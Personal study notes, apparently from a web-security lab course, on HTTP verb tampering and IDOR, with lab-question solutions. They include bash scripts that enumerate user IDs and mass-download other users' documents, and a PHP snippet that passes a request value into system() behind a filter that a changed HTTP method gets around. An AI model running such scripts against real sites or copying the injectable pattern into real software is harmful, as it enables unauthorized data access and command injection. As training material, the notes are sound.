#### HTTP Verb Tampering

 An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods.

#### Insecure Direct Object References (IDOR)

IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers.

#### XML External Entity (XXE) Injection

Many web applications process XML data as part of their functionality.


## HTTP verb tampering

 HTTP has [9 different verbs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) that can be accepted as HTTP methods by web servers

| METHOD                                                                     | DESCRIPTION                                                                                                                                                                                                                      |
| -------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `GET`                                                                      | The `GET` method requests a representation of the specified resource. Requests using `GET` should only retrieve data and should not contain a request [content](https://developer.mozilla.org/en-US/docs/Glossary/HTTP_Content). |
| `HEAD`                                                                     | The `HEAD` method asks for a response identical to a `GET` request, but without a response body.                                                                                                                                 |
| `POST`                                                                     | The `POST` method submits an entity to the specified resource, often causing a change in state or side effects on the server.                                                                                                    |
| `PUT`                                                                      | The `PUT` method replaces all current representations of the target resource with the request [content](https://developer.mozilla.org/en-US/docs/Glossary/HTTP_Content).                                                         |
| `DELETE`                                                                   | The `DELETE` method deletes the specified resource.                                                                                                                                                                              |
| `CONNECT`                                                                  | The `CONNECT` method establishes a tunnel to the server identified by the target resource.                                                                                                                                       |
| `OPTIONS`                                                                  | The `OPTIONS` method describes the communication options for the target resource.                                                                                                                                                |
| `TRACE`                                                                    | The `TRACE` method performs a message loop-back test along the path to the target resource.                                                                                                                                      |
| [`PATCH`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/PATCH) | The `PATCH` method applies partial modifications to a resource.                                                                                                                                                                  |
# Bypassing Basic Authentication

### Identify
![[Pasted image 20250225132859.png]]

if we try to press reset we get a prompt to login but we dont have the username or apssword

and get a 401 unauthorized page

## Exploit

To try and exploit the page, we need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it:

![[Pasted image 20250225134505.png]]

To test if the server accepts HEAD requests we can send an OPTIONS request to it and see what methods are accepted  using curl
```shell
curl -i -X OPTIONS http://SERVER_IP:PORT/
```

we can see that the resposne shows Allow: POST,OPTIONS,HEAD,GET which means that web server accepts these options.

# Bypassing Security Filters

Some filters are only applied toa  certain type of request and not on others allowing us to simmply change the request and still execute the request successfully.
## Identify
In the `File Manager` web application, if we try to create a new file name with special characters in its name (e.g. `test;`), we get the following message: Malicious request Denied!

## Exploit

To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use `Change Request Method` to change it to another method:

### QUESTION

for the question paste in the command into the field and then in burp right click the request and do change method

# Verb Tampering Prevention

## Insecure Configuration

The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

##### tomcat

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

## Insecure Coding

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

# Intro to IDOR
`Insecure Direct Object References (IDOR)` vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application.

what happens when we request download.php?file_id=123 but we also tryt to request download.php?file_id=124 which may not belong to us.

## What Makes an IDOR Vulnerability

Just exposing a direct reference to an internal object or resource is not a vulnerability in itself.

However, this may make it possible to exploit another vulnerability: a `weak access control system`.

 `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`


## Impact of IDOR Vulnerabilities
IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with `IDOR Insecure Function Calls`.

`IDOR Information Disclosure Vulnerabilities`.


# Identifying IDORs

## URL Parameters & APIs

Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`)

## AJAX Calls

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR.

## Understand Hashing/Encoding

For example, if we see a reference like (`?filename=ZmlsZV8xMjMucGRm`), we can immediately guess that the file name is `base64` encoded (from its character set), which we can decode to get the original object reference of (`file_123.pdf`)

parameteres can also be hashed eg:

<font color="#00b050">download.php?filename=c81e728d9d4c2f636f067f89cc14862c</font>

this is achieved by the code below
```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

we can then calculate hashes for other files and check if we can access them and therfore reveal an IDOR vulnerability.

## Compare User Roles

In case we want to thoroughly test for IDOR attacks we should register multiple users. 
This way we can study the URL parameters and identifiers in depth.

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

second user might not have the same api calls available.

# Mass IDOR Enumeration

## Insecure Parameters

Our web application assumes that we are logged in as an employee with user id <font color="#00b050">`uid=1`</font> to simplify things.

When we get to the <font color="#00b050">`Documents`</font> page, we see several documents that belong to our user.
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

We see that the page is setting our `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`)
 we can try to replace the uid with uid=2 and see if we get access to other doocumetns

at first the site looks the exact same but if we take a closer look at the source code we see that the actual urls ppoint to different files.



## Mass Enumeration

Instead of manually inspecting each udi we can do this using burp intruder or ZAPs fuzzer. and retrieve all files.

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line, as follows:

```shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

However, it is a better practice to use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links, as follows:
```shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

now lets write a bash script:

```bash
#!/bin/bash
url="http://serverip:port"

for i in {1..10};do
	for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf");do
		wget -q $url/$link
		done
done
```

#### question

the question i complete in burp intruder

and under settings -> grep -Match i added the regex: '\/documents.*?.txt'

in the burp intruder results i looked where i got a match for the regex and then replayed the sseion in the borwser to get the flag.

http://94.237.55.96:59854/documents/flag_11df........txt

# Bypassing Encoded References

In the previous section, we saw an example of an IDOR that uses employee uids in clear text, making it easy to enumerate. In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.

We see that it is sending a `POST` request to `download.php` with the following data:

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

However, there's one fatal flaw in this web application.

## Function Disclosure

Due to using popular framewoorks for web apps many web devs may mistakenly perform these hashing fuznctions on the frontend and exposing them to attackers.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:

```shell
echo -n 1 | base64 -w 0 | md5sum
```

>[!note]
>We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

## Mass Enumeration

we can once again do this with a bash script or by using burp intruder or zap fuzzer

we can make md5hashes for the ids with the following oneliner:

```shell
 for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

#### question

by inspection source code 

```html
 <script>
    function downloadContract(uid) {
      window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
    }
  </script>
</head>
href="javascript:downloadContract('1')" target="_self">Employment_contract.pdf</a></li>
```

we can see that the uid is passed in and then encoded by the following stpes

1. we base64 encode the uid
2. we then encode the base64 blob with url encoding 
![[Pasted image 20250226145517.png]]
![[Pasted image 20250226145625.png]]
affter perfmoring the fuzzing in the url with burp and examining the requests we get the following anweser on a request
![[Pasted image 20250226145747.png]]

# IDOR in Insecure APIs

 IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users.

## Identifying Insecure APIs

We see that the page is sending a `PUT` request to the `/profile/api.php/profile/1` API endpoint.

. `PUT` requests are usually used in APIs to update item details, while `POST` is used to create new items, `DELETE` to delete items, and `GET` to retrieve item detail

So, unless the web application has a solid access control system on the back-end, `we should be able to set an arbitrary role for our user, which may grant us more privileges`. However, how would we know what other roles exist?

## Exploiting Insecure APIs

We know that we can change the `full_name`, `email`, and `about` parameters, as these are the ones under our control in the HTML form in the `/profile` web page. So, let's try to manipulate the other parameters.

1. Change our `uid` to another user's `uid`, such that we can take over their accounts
2. Change another user's details, which may allow us to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

So, `all of our attempts appear to have failed`. We cannot create or delete users as we cannot change our `role`. We cannot change our own `uid`, as there are preventive measures on the back-end that we cannot control, nor can we change another user's details for the same reason. `So, is the web application secure against IDOR attacks?`.

So far, we have only been testing the `IDOR Insecure Function Calls`.

However, we have not tested the API's `GET` request for `IDOR Information Disclosure Vulnerabilities`. If there was no robust access control system in place, we might be able to read other users' details, which may help us with the previous attacks we attempted.

#### QUESTION

![[Pasted image 20250226152650.png]]

# Chaining IDOR Vulnerabilities

Usually, a `GET` request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page loads, it fetches the user details with a `GET` request to the same API endpoint:

Let's send a `GET` request with another `uid`:

As we can see, this returned the details of another user, with their own `uuid` and `role`, confirming an `IDOR Information Disclosure vulnerability`:

